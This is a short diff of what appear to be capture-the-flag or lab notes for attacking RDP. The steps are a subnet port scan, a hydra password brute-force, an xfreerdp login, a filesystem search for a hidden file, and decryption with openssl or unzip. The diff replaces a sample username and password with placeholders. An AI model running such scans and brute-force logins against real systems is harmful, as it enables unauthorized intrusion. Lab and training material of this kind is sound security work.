@@ -1,11 +1,10 @@
 nmap -p 3389 ip/24
-hydra -l Jones -P /path/to/password_list.txt rdp://TARGET_IP OR
+hydra -l name -P /path/to/password_list.txt rdp://TARGET_IP OR
 hydra-l <username> -P </path to password wordlist.txt> <IP> RDP
-xfreerdp /u:Jones /p:J0n3sPassw0rd /v:TARGET_IP
+xfreerdp /u:name /p:password /v:TARGET_IP
 look for the hide.cfe file write find / -iname “name of txt file” 2>/dev/null OR (ls -R / |
 grep “name.txt”)
 If encrypted Decrypt the hide.cfe File
-#openssl enc -aes-256-cbc -d -in hide.cfe -out decrypted_image.jpg -pass pass:<password>
+#openssl enc -aes-256-cbc -d -in filename.cfe -out image.jpg -pass pass:<password>
 If hide.cfe is a compressed/encrypted archive, extract it using unzip or another tool:
-#unzip hide.cfe -P J0n3sPassw0rd
-crc32 imagefile.png
+#unzip filename.cfe -P password
